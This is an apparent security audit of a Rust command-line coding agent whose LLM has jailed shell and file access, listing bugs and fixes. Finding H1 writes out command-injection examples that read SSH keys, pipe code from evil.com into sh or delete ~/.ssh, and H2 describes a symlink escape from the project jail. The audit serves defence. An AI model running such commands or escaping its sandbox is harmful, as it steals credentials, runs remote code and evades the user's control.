# Code audit: bugs and security findings

Audit performed 2026-04-15 against the `cld` branch (HEAD `e796b44`). All
findings below were verified against the current source — agent-reported
issues that didn't hold up against the code (e.g. "edition 2024 is invalid"
— it has been stable since Rust 1.85) were dropped.

Severity is calibrated to the threat model of a local CLI agent driven by a
quantized LLM with file/shell access jailed to the project root.

---

## Critical / High

### H1. Shell allowlist bypass via prefix match + `sh -c`

- **Where:** `src/tools/permissions.rs:230-251` (and the duplicate at
  `:295-336`); execution at `src/tools/shell.rs:68-71`.
- **What:** `check_shell` matches the *full command string* against the
  allowlist with `cmd_trimmed.starts_with(prefix)`, then `start()` runs the
  command through `sh -c "<command>"`. The shell happily interprets `;`,
  `|`, `&&`, backticks, `$(…)`, redirections.
- **Exploits:**
  - `cargo --version; cat ~/.ssh/id_rsa` — passes `cargo` prefix.
  - `git status && curl evil.com/x | sh` — passes `git status`.
  - `find . -exec sh -c 'curl evil.com|sh' \;` — passes `find ` prefix.
  - The `BLOCKED_COMMANDS` list (line 452-463) only matches literal
    `rm -rf /`, `rm -rf ~`, `curl | sh`, etc. Trivially bypassed by
    `rm -rf $HOME/.ssh` or `rm -r ~/.ssh`.
- **Fix:** parse the command (e.g. `shell_words::split`), allowlist on the
  *binary name* only, reject metacharacters (`;`, `|`, `&`, `&&`, `||`,
  `` ` ``, `$(`, `>`, `<`) unless the user explicitly approves the full
  pipeline. The interactive prompt is the right escape hatch.

### H2. Symlink-based jail escape via permission fast path

- **Where:** `src/tools/permissions.rs:131-141`.
- **What:** When the input path contains no `..` component, the function
  returns `project_root.join(path)` *without* canonicalizing. The in-source
  comment justifies this for the `.miniswe → /output` symlink that the
  docker image installs. Side effect: any in-tree symlink is followed
  blindly.
- **Exploits:** anything that can plant a symlink inside the project root
  — a malicious git repo, a tarball, the LLM via `shell` running `ln -s
  /etc/passwd inside.txt` — gets `read_file`/`write_file`/`delete`/
  `replace_range` access to the symlink target.
- **Fix:** still resolve symlinks (`canonicalize`), but accept any path
  whose canonical form starts with `project_root`. The legitimate
  `.miniswe → /output` case can be handled by either (a) canonicalizing
  `project_root` itself to include `/output`, or (b) maintaining an
  explicit allowlist of known "external" symlink targets.

### H3. `prompt_user` fallback corrupts the TUI

- **Where:** `src/tools/permissions.rs:434-448` and `:469-484`.
- **What:** `request_user_decision` tries to send a `PermissionRequest`
  event over the TUI channel; if the channel isn't set or send fails, it
  falls through to `prompt_user`, which calls
  `crossterm::terminal::disable_raw_mode()`, writes ANSI escapes to
  stderr, blocks on `stdin.read_line`, and **never re-enables raw mode**.
  The comment claims "reedline will do that on next read_line()" — but
  the TUI plan in memory removes reedline in favor of ratatui.
- **Impact:** in TUI mode the screen is corrupted, input goes to stdin
  instead of the TUI handler, and on TUI exit the terminal is left in an
  inconsistent state.
- **Fix:** in TUI mode, treat channel send failure as deny (don't fall
  through). When ratatui lands, delete `prompt_user` entirely or guard it
  behind a non-TUI flag.

---

## Medium

### M1. Blocking I/O on the tokio runtime

- `src/tools/shell.rs:114` — `wait()` does `std::thread::sleep(100ms)` in
  a loop. It is `pub fn` (sync) but called from the async `execute()`. N
  concurrent shell commands stall N tokio worker threads for the duration
  of each command (default timeout 30s+).
- `src/tools/write_file.rs:33,73`, `src/tools/fast/replace_range.rs:44,100`,
  `src/tools/fast/insert_at.rs` (analogous) use `std::fs` instead of
  `tokio::fs`. Fine for small files; bad for large files or slow disks.
- `src/cli/commands/run.rs:202-208` (per agent finding — verify before
  fixing): the ctrl-C handler appears to busy-loop with
  `tokio::signal::ctrl_c().await.ok()` — after the first signal the future
  resolves immediately on subsequent calls.
- **Fix:** push the shell `wait` loop onto `tokio::task::spawn_blocking` or
  use async polling; switch fs calls to `tokio::fs`; make the ctrl-C task
  wait once and exit.

### M2. No `Drop` for `RunningShellCommand`

- **Where:** `src/tools/shell.rs:20-24`.
- **What:** the struct holds a `Child` but has no `Drop`. If it's dropped
  without going through `kill`/`interrupt`/`render_finished_result` (panic,
  `?` propagation in an outer caller, channel hangup mid-wait), the child
  process is leaked.
- **Fix:**

  ```rust
  impl Drop for RunningShellCommand {
      fn drop(&mut self) {
          let _ = self.child.kill();
          let _ = self.child.wait();
          let _ = std::fs::remove_file(&self.stdout_path);
          let _ = std::fs::remove_file(&self.stderr_path);
      }
  }
  ```

### M3. PID-reuse race in `terminate_process_tree`

- **Where:** `src/tools/shell.rs:237-249`.
- **What:** `child.id()` is read once into `pid`, then both `kill(-pid, …)`
  and `kill(pid, …)` are issued. If the child has already exited and the
  kernel recycled the PID, an unrelated process gets killed.
- **Window:** narrow but real on busy systems with high PID churn.
- **Fix:** call `child.try_wait()` first and skip the `kill` if the child
  has already reaped; or use `pidfd_send_signal` on Linux.

### M4. Streaming JSON parser swallows malformed chunks silently

- **Where:** `src/llm/mod.rs` SSE chunk handler — `let Ok(parsed) =
  serde_json::from_str::<StreamChunk>(data) else { continue; };`.
- **What:** a truncated tool-call delta is dropped without a log; the
  accumulated `arguments` ends up missing characters or empty, and the
  tool dispatch fails with a confusing parse error one round later.
- **Fix:** at minimum log at debug level with the offending chunk size and
  the parse error. Better: track when a chunk fails to parse and surface
  it as a recoverable LLM error (similar to commit `5c4e4fe`'s 500-recovery
  path).

### M5. Non-atomic config writes

- **Where:** `src/config/mod.rs::Config::save()` — calls `fs::write(&path,
  contents)` directly.
- **Impact:** a crash, kill, or power loss mid-write truncates the config.
- **Fix:** write to `<path>.tmp` then `fs::rename` (atomic on POSIX). Apply
  the same pattern to revisions persistence and any other on-disk state.

### M6. Pervasive `Mutex::lock().unwrap()` (poisoning panic)

- **Where:** `src/tools/permissions.rs` (every approval check),
  `src/tools/fast/revisions.rs:143,176,213,240,251,277,288`, and many call
  sites in `src/runtime/mod.rs`, `src/cli/commands/run.rs`,
  `src/cli/commands/repl.rs`.
- **What:** if any thread panics while holding the lock, every future
  caller panics on `unwrap()`. For long-lived sessions this is a
  liveness risk — one bug poisons the agent for the rest of the run.
- **Fix:** switch to `parking_lot::Mutex` (no poisoning) or handle
  `PoisonError` explicitly and recover the inner state. Pick one and apply
  consistently.

---

## Low

### L1. `r.jina.ai/{url}` URL building is fragile

- **Where:** `src/tools/web.rs:285`.
- **What:** `format!("https://r.jina.ai/{url}")` blindly concatenates the
  user-provided URL. `reqwest` will reject obviously malformed URLs but
  spaces / unicode fail in confusing ways. Not a security issue (the only
  consequence is a bad upstream request) but worth normalising.

### L2. `get_gh_token` shells out synchronously from async path

- **Where:** `src/tools/web.rs:336-345`.
- **What:** `std::process::Command::new("gh").output()` blocks the calling
  tokio worker until `gh` returns. Usually fast, occasionally slow.
- **Fix:** `tokio::process::Command` or move into `spawn_blocking`.

### L3. Logging may persist user-pasted secrets

- **Where:** `src/logging.rs:149-154` (`tool_call_detail`), `:228-235`
  (`llm_request`).
- **What:** full JSON args are logged to `~/.miniswe/logs/*.log` at debug
  level (which the README describes as routine). The Serper key is *not*
  in args (loaded from disk), but if the user pastes a credential into a
  prompt that gets passed to `web(query=…)` or `shell(command=…)`, it
  lands on disk in plaintext, truncated only at 500 chars.
- **Fix:** either drop debug-level arg logging by default, or scrub a
  small list of common token patterns (`Bearer …`, `sk-…`, `gh[psu]_…`).

### L4. Double `build_feedback` per fast-mode edit

- **Where:** `src/tools/fast/replace_range.rs:111-150`,
  `src/tools/fast/insert_at.rs` (analogous).
- **What:** `build_feedback` is awaited twice — once before `record()` so
  its stats can be stored in the revisions row, and a second time after
  so the rendered output includes the new row. LSP diagnostics + AST
  parsing run twice per edit, doubling latency.
- **Fix:** render the new revision row from the already-computed `fb`
  stats; skip the second `build_feedback`.

### L5. `delete_file` and `write_file` re-`join` the path after dispatch validates

- **Where:** `src/tools/delete_file.rs:21`, `src/tools/write_file.rs:116-122`.
- **What:** dispatch (`src/tools/dispatch.rs:80-85, 134-137`) calls
  `perms.resolve_and_check_path(path)`, then the tool re-joins
  `project_root.join(path)`. Today this is harmless because dispatch
  always validates and the re-join is identical for non-`..` paths. It is
  a footgun: any future caller that skips dispatch (tests, new entry
  points, MCP-driven calls) loses validation.
- **Fix:** either pass the validated `PathBuf` through, or have the tools
  call `resolve_and_check_path` themselves as defence in depth.

### L6. Many `let _ = events.send(…)` swallow channel-closed errors

- **Where:** `src/runtime/mod.rs:53,63,83,100,154,175,200-225`,
  `src/cli/commands/run.rs:107-108,212,275,335,345,357,363`.
- **What:** silencing send failures is correct for graceful shutdown,
  but the same pattern hides real bugs (receiver dropped early, channel
  closed by accident). Hard to triage when only a subset of events
  arrive.
- **Fix:** factor a `try_send_or_log` helper that logs at debug when send
  fails, so silent loss of events is at least observable.

### L7. `urlencoded` quirk

- **Where:** `src/tools/web.rs:347-355`.
- **What:** `' '` is encoded as `'+'` (correct for query strings, wrong
  for URL paths). All Serper / SearXNG / GitHub uses are query strings,
  so currently fine. Document the constraint or rename.

---

## Suggested fix order

1. **H1** — shell allowlist hardening (most exploitable, blast radius is
   the user's home dir).
2. **H2** — symlink fast-path (single-line behaviour change with an
   allowlist for the docker case).
3. **H3** — `prompt_user` TUI corruption (small, but blocks the in-flight
   ratatui work).
4. **M2 + M3** — `RunningShellCommand` Drop and PID-reuse race
   (straightforward, prevent process leaks).
5. **M5** — atomic config writes.
6. **M1** — blocking I/O cleanup.
7. **M6** — pick a mutex strategy (parking_lot vs explicit poison
   handling) and apply consistently.
8. The rest as opportunistic cleanups.

---

## Notes on what was *not* a bug

A first-pass agent flagged several issues that did not hold up against
the source. Listed here so they don't get re-discovered:

- **"edition = 2024 is invalid"** — stable since Rust 1.85 (2025-02).
- **"`delete_file` skips the jail check"** — dispatch (`dispatch.rs:80-85`)
  validates before delegating. Real concern is the layering footgun (L5),
  not a live bypass.
- **"Serper key is logged"** — the key is read from
  `~/.miniswe/serper.key` and never appears in tool args. Real concern is
  user-pasted secrets in unrelated args (L3).
- **Various `chars().count()` perf nits** — measurable only in hot loops
  none of these are in.
